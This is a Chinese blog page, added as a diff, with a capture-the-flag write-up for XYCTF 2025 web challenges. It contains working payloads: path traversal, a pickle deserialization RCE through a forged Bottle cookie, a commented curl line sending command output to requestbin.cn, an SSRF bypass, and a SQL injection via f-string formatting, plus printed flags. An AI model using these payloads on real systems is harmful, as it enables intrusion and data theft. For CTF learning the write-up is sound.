@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="弱鸡只做了两道 Signin这道题做的好伤感，一直奔着出网，觉得我外带不行那么我就重启我的VPS打反弹shell，反正本地分非常成功，但是就这样试了几个小时，没试出来，有点蛋疼也算是灵机一动，试试把回显放进文件，反正我们已经实现文件读取了，最后真的一下就成功了，想死 123456789101112131415161718192021222324252627282930313233343536373">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XYCTF-WP">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/XYCTF-WP/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="弱鸡只做了两道 Signin这道题做的好伤感，一直奔着出网，觉得我外带不行那么我就重启我的VPS打反弹shell，反正本地分非常成功，但是就这样试了几个小时，没试出来，有点蛋疼也算是灵机一动，试试把回显放进文件，反正我们已经实现文件读取了，最后真的一下就成功了，想死 123456789101112131415161718192021222324252627282930313233343536373">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hexo.sheep-sys-sudo.top/XYCTF-WP/1.png">
+<meta property="article:published_time" content="2025-04-07T12:45:57.000Z">
+<meta property="article:modified_time" content="2025-09-09T07:39:17.582Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="赛题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hexo.sheep-sys-sudo.top/XYCTF-WP/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>XYCTF-WP</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/XYCTF-WP/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&text=XYCTF-WP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&title=XYCTF-WP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&is_video=false&description=XYCTF-WP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XYCTF-WP&body=Check out this article: https://hexo.sheep-sys-sudo.top/XYCTF-WP/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&title=XYCTF-WP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&title=XYCTF-WP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&title=XYCTF-WP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&title=XYCTF-WP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&name=XYCTF-WP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&t=XYCTF-WP"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Signin"><span class="toc-number">1.</span> <span class="toc-text">Signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#puzzle"><span class="toc-number">2.</span> <span class="toc-text">puzzle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fate"><span class="toc-number">3.</span> <span class="toc-text">Fate</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        XYCTF-WP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-07T12:45:57.000Z" class="dt-published" itemprop="datePublished">2025-04-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/web/">web</a> › <a class="category-link" href="/categories/web/WP/">WP</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/web/" rel="tag">web</a>, <a class="p-category" href="/tags/%E8%B5%9B%E9%A2%98/" rel="tag">赛题</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><em><strong>弱鸡只做了两道</strong></em></p>
+<h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>这道题做的好伤感，一直奔着出网，觉得我外带不行那么我就重启我的VPS打反弹shell，反正本地分非常成功，但是就这样试了几个小时，没试出来，有点蛋疼<br>也算是灵机一动，试试把回显放进文件，反正我们已经实现文件读取了，最后真的一下就成功了，想死</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">flag in /flag_&#123;uuid4&#125;</span><br><span class="line"></span><br><span class="line">from bottle import Bottle, request, response, redirect, static_file, run, route</span><br><span class="line"></span><br><span class="line">with open(&#x27;../../secret.txt&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line"></span><br><span class="line">    secret = f.read()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">app = Bottle()</span><br><span class="line"></span><br><span class="line">@route(&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line">def index():</span><br><span class="line"></span><br><span class="line">    return &#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@route(&#x27;/download&#x27;)</span><br><span class="line"></span><br><span class="line">def download():</span><br><span class="line"></span><br><span class="line">    name = request.query.filename</span><br><span class="line"></span><br><span class="line">    if &#x27;../../&#x27; in name or name.startswith(&#x27;/&#x27;) or name.startswith(&#x27;../&#x27;) or &#x27;\\&#x27; in name:</span><br><span class="line"></span><br><span class="line">        response.status = 403</span><br><span class="line"></span><br><span class="line">        return &#x27;Forbidden&#x27;</span><br><span class="line"></span><br><span class="line">    with open(name, &#x27;rb&#x27;) as f:</span><br><span class="line"></span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">@route(&#x27;/secret&#x27;)</span><br><span class="line"></span><br><span class="line">def secret_page():</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line"></span><br><span class="line">        session = request.get_cookie(&quot;name&quot;, secret=secret)</span><br><span class="line"></span><br><span class="line">        if not session or session[&quot;name&quot;] == &quot;guest&quot;:</span><br><span class="line"></span><br><span class="line">            session = &#123;&quot;name&quot;: &quot;guest&quot;&#125;</span><br><span class="line"></span><br><span class="line">            response.set_cookie(&quot;name&quot;, session, secret=secret)</span><br><span class="line"></span><br><span class="line">            return &#x27;Forbidden!&#x27;</span><br><span class="line"></span><br><span class="line">        if session[&quot;name&quot;] == &quot;admin&quot;:</span><br><span class="line"></span><br><span class="line">            return &#x27;The secret has been deleted!&#x27;</span><br><span class="line"></span><br><span class="line">    except:</span><br><span class="line"></span><br><span class="line">        return &quot;Error!&quot;</span><br><span class="line"></span><br><span class="line">run(host=&#x27;0.0.0.0&#x27;, port=8080, debug=False)</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到&#x2F;download路由可以实现任意文件读取，其实绕过过滤很简单，直接.&#x2F;..&#x2F;.&#x2F;..&#x2F;secret.txt实现任意文件读取，读取到密匙Hell0_H@cker_Y0u_A3r_Sm@r7<br>但是我们必须要命令执行才能知道flag文件的路径</p>
+<p>可以实现伪造session,但是聪明的你已经发现，&#x2F;secret路由并没有命令执行的部分，这里面还有什么说法呢？（出题人提示可以RCE服务器）</p>
+<p>这个时候检索下，或者直接去翻bottle的源码()<br>get_cookie的操作<br>存在pickle反序列化<br>我们直接本地伪造session</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from bottle import Bottle, route, run, template, request, response</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">Mountain=&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">class Test:</span><br><span class="line"></span><br><span class="line">    def __reduce__(self):</span><br><span class="line"></span><br><span class="line">        #return (eval, (&quot;&quot;&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://requestbin.cn:80/1lhkqfa1?data=$(ls | base64)&#x27;).read()&quot;&quot;&quot;,))</span><br><span class="line"></span><br><span class="line">        return (eval, (&quot;&quot;&quot;__import__(&#x27;os&#x27;).system(&#x27;ls / &gt; /secret.txt&#x27;)&quot;&quot;&quot;,))</span><br><span class="line"></span><br><span class="line">@route(&quot;/hello&quot;)</span><br><span class="line"></span><br><span class="line">def hello_world():</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line"></span><br><span class="line">        session = &#123;&quot;name&quot;: Test()&#125;</span><br><span class="line"></span><br><span class="line">        response.set_cookie(&quot;name&quot;, session, secret=Mountain)</span><br><span class="line"></span><br><span class="line">        return &quot;ok&quot;</span><br><span class="line"></span><br><span class="line">    except:</span><br><span class="line"></span><br><span class="line">        return &quot;hacker!!! I&#x27;ve caught you&quot;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">@route(&#x27;/secret&#x27;)</span><br><span class="line"></span><br><span class="line">def secret_page():</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line"></span><br><span class="line">        session = request.get_cookie(&quot;name&quot;, secret=Mountain)</span><br><span class="line"></span><br><span class="line">        if not session or session[&quot;name&quot;] == &quot;guest&quot;:</span><br><span class="line"></span><br><span class="line">            session = &#123;&quot;name&quot;: &quot;guest&quot;&#125;</span><br><span class="line"></span><br><span class="line">            response.set_cookie(&quot;name&quot;, session, secret=Mountain)</span><br><span class="line"></span><br><span class="line">            return &#x27;Forbidden!&#x27;</span><br><span class="line"></span><br><span class="line">        if session[&quot;name&quot;] == &quot;admin&quot;:</span><br><span class="line"></span><br><span class="line">            return &#x27;The secret has been deleted!&#x27;</span><br><span class="line"></span><br><span class="line">    except:</span><br><span class="line"></span><br><span class="line">        return &quot;Error!&quot;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    run(host=&quot;0.0.0.0&quot;, port=8089)</span><br></pre></td></tr></table></figure></div>
+<p>我最开始的想法是出网的，外带试了，反弹shell试了都成功，但题目环境不出网，浪费了很多时间<br>可以把回显写入secret.txt文件的,还是没做熟啊<br>最后也是成功知道flag文件名，成功读取到<br>flag{We1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u!}</p>
+<h2 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h2><p>第一步，把代码反混淆掉<br>来这个网站<a target="_blank" rel="noopener" href="https://beautifier.io/">https://beautifier.io/</a><br>第二步，定位infernity<br>找到关键函数<br>第三步，明确什么定义拼图成功，找到这个变量，将它改为true<br>第四步，控制台输出<br><img src="/XYCTF-WP/1.png"></p>
+<h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><p>心路历程:这道题分三个部分，第一块是SSRF相关绕过，第二块是python字符串格式化漏洞，第三块是sql语句，第二块卡死了给，还是题给做少了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">import flask</span><br><span class="line">import sqlite3</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import json</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">blacklist = string.ascii_letters</span><br><span class="line">def binary_to_string(binary_string):</span><br><span class="line">    if len(binary_string) % 8 != 0:</span><br><span class="line">        raise ValueError(&quot;Binary string length must be a multiple of 8&quot;)</span><br><span class="line">    binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]</span><br><span class="line">    string_output = &#x27;&#x27;.join(chr(int(chunk, 2)) for chunk in binary_chunks)</span><br><span class="line">    return string_output</span><br><span class="line">@app.route(&#x27;/proxy&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def nolettersproxy():</span><br><span class="line">    url = flask.request.args.get(&#x27;url&#x27;)</span><br><span class="line">    if not url:</span><br><span class="line">        return flask.abort(400, &#x27;No URL provided&#x27;)</span><br><span class="line">    target_url = &quot;http://lamentxu.top&quot; + url</span><br><span class="line">    for i in blacklist:</span><br><span class="line">        if i in url:</span><br><span class="line">            return flask.abort(403, &#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;)</span><br><span class="line">    if &quot;.&quot; in url:</span><br><span class="line">        return flask.abort(403, &#x27;No ssrf allowed&#x27;)</span><br><span class="line">    response = requests.get(target_url)</span><br><span class="line">    return flask.Response(response.content, response.status_code)</span><br><span class="line">def db_search(code):</span><br><span class="line">    with sqlite3.connect(&#x27;database.db&#x27;) as conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;&#123;code&#125;&#x27;)))))))&quot;)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    return None if found is None else found[0]</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    print(flask.request.remote_addr)</span><br><span class="line">    return flask.render_template(&quot;index.html&quot;)</span><br><span class="line">@app.route(&#x27;/1337&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def api_search():</span><br><span class="line">    if flask.request.remote_addr == &#x27;127.0.0.1&#x27;:</span><br><span class="line">        code = flask.request.args.get(&#x27;0&#x27;)</span><br><span class="line">        if code == &#x27;abcdefghi&#x27;:</span><br><span class="line">            req = flask.request.args.get(&#x27;1&#x27;)</span><br><span class="line">            try:</span><br><span class="line">                req = binary_to_string(req)</span><br><span class="line">                print(req)</span><br><span class="line">                req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span><br><span class="line">            except:</span><br><span class="line">                flask.abort(400, &quot;Invalid JSON&quot;)</span><br><span class="line">            if &#x27;name&#x27; not in req:</span><br><span class="line">                flask.abort(400, &quot;Empty Person&#x27;s name&quot;)</span><br><span class="line">            name = req[&#x27;name&#x27;]</span><br><span class="line">            if len(name) &gt; 6:</span><br><span class="line">                flask.abort(400, &quot;Too long&quot;)</span><br><span class="line">            if &#x27;\&#x27;&#x27; in name:</span><br><span class="line">                flask.abort(400, &quot;NO &#x27;&quot;)</span><br><span class="line">            if &#x27;)&#x27; in name:</span><br><span class="line">                flask.abort(400, &quot;NO )&quot;)</span><br><span class="line">            &quot;&quot;&quot;</span><br><span class="line">            Some waf hidden here ;)</span><br><span class="line">            &quot;&quot;&quot;</span><br><span class="line">            fate = db_search(name)</span><br><span class="line">            if fate is None:</span><br><span class="line">                flask.abort(404, &quot;No such Person&quot;)</span><br><span class="line">            return &#123;&#x27;Fate&#x27;: fate&#125;</span><br><span class="line">        else:</span><br><span class="line">            flask.abort(400, &quot;Hello local, and hello hacker&quot;)</span><br><span class="line">    else:</span><br><span class="line">        flask.abort(403, &quot;Only local access allowed&quot;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure></div>
+<p>SSRF：<br>使用@绕过前缀;使八进制绕过.号(注意加上端口8080…)；由于不能有字母，对于所谓的abcdefghi，采取双重url编码即可，注意&amp;也编码成%26；最后的二进制简单写一个代码转换即可</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def string_to_binary(input_string):</span><br><span class="line">    binary_chunks = []</span><br><span class="line">    for char in input_string:</span><br><span class="line">        binary_char = bin(ord(char))[2:].zfill(8)</span><br><span class="line">        binary_chunks.append(binary_char)</span><br><span class="line">    binary_string = &#x27;&#x27;.join(binary_chunks)</span><br><span class="line">    return binary_string</span><br></pre></td></tr></table></figure></div>
+<p>所以，第一块的payload即：<code>?url=@2130706433/?0=%2561%2562%2563%2564%2565%2566%2567%2568%2569%261=&#39;转化到的二进制&#39;</code><br>第二块需要我们如何绕过严密的WAF实现sql注入<br>注意我们在init_db.py上找到flag位置LAMENTXU,存在flag,即绕过进行<code>&quot;&#39;)))))) union select fate from FATETABLE where name=&#39;LAMENTXU&#39; --&quot;</code>可<br>那么如何传入？<code>python格式化漏洞</code><br>注意到有f’xxxx’，简单来讲，它可以把其他类型转化为字符串；这道题就这样，但是关于该漏洞的知识点，有机会会总结一篇<br>例子</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">a=json.dumps(&#123;&quot;name&quot;:&#123;&quot;1afasagagaga&quot;:1&#125;&#125;)#len为1</span><br><span class="line">#a=json.dumps(&#123;&quot;name&quot;:(&#x27;1afasagagaga&#x27;,&#x27;2&#x27;)&#125;)#len为2</span><br><span class="line">#a=json.dumps(&#123;&quot;name&quot;:[&#x27;1afasagagaga&#x27;,&#x27;2&#x27;]&#125;)#len为2</span><br><span class="line">b=json.loads(a)</span><br><span class="line">print(b)</span><br><span class="line">asd=b[&#x27;name&#x27;]</span><br><span class="line">print(asd)</span><br><span class="line">print(len(asd))</span><br><span class="line">print(f&#x27;aaa&#123;asd&#125;&#x27;)#原sql拼接用了f&#x27;&#x27;因此存在python格式化字符串漏洞，,可以用列表，元组，字典绕过len，即WAF</span><br></pre></td></tr></table></figure></div>
+<p>这里限制了列表和元组，使用字典<br>即可构造<code>&#123;&quot;name&quot;:&#123;&quot;&#39;)))))) union select fate from FATETABLE where name=&#39;LAMENTXU&#39; -- &quot;:1&#125;&#125;</code><br>即最终的payload：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=@2130706433/1337?0=%2561%2562%2563%2564%2565%2566%2567%2568%2569%261=011110110010001001101110011000010110110101100101001000100011101000100000011110110010001000100111001010010010100100101001001010010010100100101001001010010010000001110101011011100110100101101111011011100010000001110011011001010110110001100101011000110111010000100000011001100110000101110100011001010010000001100110011100100110111101101101001000000100011001000001010101000100010101010100010000010100001001001100010001010010000001110111011010000110010101110010011001010010000001101110011000010110110101100101001111010010011101001100010000010100110101000101010011100101010001011000010101010010011100100000001011010010110100100000001000100011101000100000001100010111110101111101</span><br></pre></td></tr></table></figure></div>
+<p>成功拿到flag~</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Signin"><span class="toc-number">1.</span> <span class="toc-text">Signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#puzzle"><span class="toc-number">2.</span> <span class="toc-text">puzzle</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fate"><span class="toc-number">3.</span> <span class="toc-text">Fate</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/XYCTF-WP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
